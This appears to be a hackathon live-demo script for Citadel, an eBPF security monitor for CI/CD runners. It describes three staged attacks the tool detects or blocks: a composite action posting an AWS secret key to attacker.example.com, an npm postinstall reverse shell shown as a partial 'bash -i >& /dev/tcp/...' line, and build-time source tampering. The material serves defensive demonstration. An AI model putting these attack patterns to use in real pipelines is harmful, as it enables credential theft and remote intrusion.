# 🛡️ Citadel — Live Demo Script (5 minutes)

A beat-by-beat walkthrough for hackathon judging. Every step has its exact
commands, the browser tab to be focused on, and what the audience should be
seeing.

If anything fails live, fall back to the recording (`docs/citadel-demo.mp4`)
without breaking eye contact.

---

## Pre-flight (the morning of the demo, NOT live)

```sh
make demo-reset          # nuke previous state
make local-images        # rebuild all four images
make docker-up           # backend + detector + dashboard come up

# Verify everything's green:
curl http://localhost:8080/healthz   # backend
curl http://localhost:8000/healthz   # detector
open  http://localhost:3000          # dashboard
```

Open browser tabs in this order, in a fresh profile:

1. `https://github.com/<you>/citadel/actions` — workflow runs view
2. `http://localhost:3000/runs` — Citadel dashboard
3. `https://webhook.site/<your-url>` — to show real-time exfil capture
4. `https://github.com/<you>/citadel/blob/main/examples/attacks/exfil/action.yml` — the "innocent" attack source

Have these terminals open:

- T1: tailing the agent log → `docker logs -f citadel`
- T2: clean shell for ad-hoc commands

---

## 0:00 — Setup (15 s)

> "CI/CD runners are the most powerful, least monitored part of modern
> software. They have your secrets, your source, your deploys — and you have
> almost zero visibility into what they do at runtime. **Citadel changes
> that. eBPF-based EDR running inside every job.**"

Show the dashboard at `/runs` — empty state with the shield icon. Set the
stage: "everything I show you in the next 5 minutes is happening live in a
real GitHub Actions runner."

---

## 0:15 — Attack 1: Credential exfiltration (90 s)

**Goal: PREVENT EXFILTRATION.**

### Show the workflow

Switch to tab 4 (the YAML on GitHub). Scroll to `./examples/attacks/exfil`:

> "Here's a workflow that uses a composite action called
> `definitely-not-malicious`. Looks innocent — runs `curl` to do a 'version
> check'. In reality it's POSTing the `AWS_SECRET_ACCESS_KEY` to a third
> party. **This is a supply-chain attack.**"

### Run it in audit mode

```sh
gh workflow run attack-1-exfil.yml
```

Switch to tab 1 (Actions view) — show the workflow starting. After ~30 s it
completes successfully — **no error**.

Switch to tab 3 (webhook.site) — the leaked key appears. **"The credential
just left the building, and the CI logs say nothing."**

### Show what Citadel saw

Switch to tab 2 (`localhost:3000/runs`). Click the new run.

- **Network tab**: point at the row for `attacker.example.com:443` from
  process `curl` in step `definitely-not-malicious`.
  > "Citadel captured every outbound TCP from inside the runner. We see
  > exactly which step, which process, which destination."
- **Processes tab**: expand the process tree — `bash → action runner → curl`.
  > "Full ancestry. This isn't a network log — it's the kernel telling us
  > who did what."

### Generate a policy, switch to block mode

Click "Generate Policy" (or visit `/policies` and create one):
- name: `victim-ci-block`
- scope: `<owner>/citadel` · `attack-1-exfil`
- mode: `block`
- allowlist: `github.com`, `registry.npmjs.org`

Re-run the workflow:

```sh
gh workflow run attack-1-exfil.yml
```

Watch tab 3 (webhook.site) — **no new event**. The exfil was dropped at the
kernel by the `cgroup_skb/egress` program.

Dashboard shows the run with a **red banner: "Citadel blocked 1 outbound
connection"** and the network row gets a **BLOCKED** badge.

> "Same workflow, same attack, different outcome. Zero code changes — just a
> policy."

---

## 1:45 — Attack 2: Reverse shell (75 s)

**Goal: ANOMALY DETECTION.**

### Show the workflow

Switch back to tab 4. Open `examples/attack-2-revshell.yml` and
`examples/attacks/revshell/index.js`:

> "A 'compromised npm dependency.' Its `postinstall` hook spawns a bash with
> `/dev/tcp` redirection — the canonical Linux reverse shell. **This is how
> the eslint-scope attack went down in 2018, this is how the
> @ctx/event-stream attack went down, this is the pattern.**"

### Run it

```sh
gh workflow run attack-2-revshell.yml
```

Switch to tab 1. Workflow succeeds (no error — the reverse-shell call fails
silently because the attacker host doesn't resolve; but the *attempt* was
made).

### Show the detection

Tab 2 (`/runs`). Open the new run. Sidebar shows a **critical** detection:
`possible_reverse_shell`. Click it.

Highlighted event in the Processes tab: `node → bash` spawning `bash -i >&
/dev/tcp/.../4444`. The detector's rule fired because:

1. A build-tool ancestor (`node`) spawned a shell-like process (`bash`).
2. The same process tree had an outbound TCP within 1 second.

> "We caught this not by signature, not by hash, not by domain blocklist —
> by **behavior**. A build tool spawning an interactive shell while making
> outbound TCP. That's the EDR pattern. Same signal CrowdStrike uses on
> endpoints; Citadel applies it to CI."

---

## 3:00 — Attack 3: Source tampering (75 s)

**Goal: DETECT TAMPERING.**

### Show the workflow

Tab 4 → `examples/attacks/tamper/action.yml`:

> "A composite action that runs *after* checkout. It appends a 'telemetry
> hook' to `index.js`. **This is build-time backdoor injection — the
> SolarWinds class of attack but at the dependency level.**"

### Run it

```sh
gh workflow run attack-3-tamper.yml
```

### Show the detections

Two ways Citadel catches this:

1. **LIVE** — Files tab. The detector's `source_modified_after_checkout`
   rule fires while the job is still running. Show the file write event:
   path under `/home/runner/work`, comm=`bash`, flags=`WRONLY|APPEND`.
2. **POST-JOB** — same run, a `file_tamper` event with `action: modified`,
   the old and new SHA256 of `examples/index.js`. The agent took a snapshot
   right after `actions/checkout` and re-hashed at the end.

> "SHA256 of every file at checkout time. SHA256 of every file at the end.
> Any drift, we know about it. **This catches the entire class of
> build-time backdoor injection.**"

---

## 4:15 — Wrap (30 s)

> "Three attacks. Three goals. One platform.
>
> - **eBPF for kernel-level visibility** — we can't be evaded by user-level
>   tricks.
> - **A Python detector with extensible rules** — write a Python class, ship
>   a new detection in 10 lines.
> - **A one-line GitHub Action** to install — `uses: <org>/citadel/action`
>   and you're done.
>
> That's Citadel. Runtime EDR for CI/CD runners."

---

## Cut list if you're running short

If you're at minute 4 and only finished attack 1, **stop**. Don't rush the
remaining two — explain what they would have shown and offer to demo
afterwards. One attack done crisply > three attacks done badly.

## What to do if a demo fails live

Same answer for all three: cut to the recording. Don't troubleshoot live —
you have one minute per scenario, no time to debug. The judges remember the
narrative, not the live execution.

```sh
# Backup video lives here:
open docs/citadel-demo.mp4
```

## Reset between runs

```sh
make demo-reset
make docker-up
```

That nukes the SQLite database, baseline state, leftover iptables rules,
agent container — fresh slate for the next attempt.
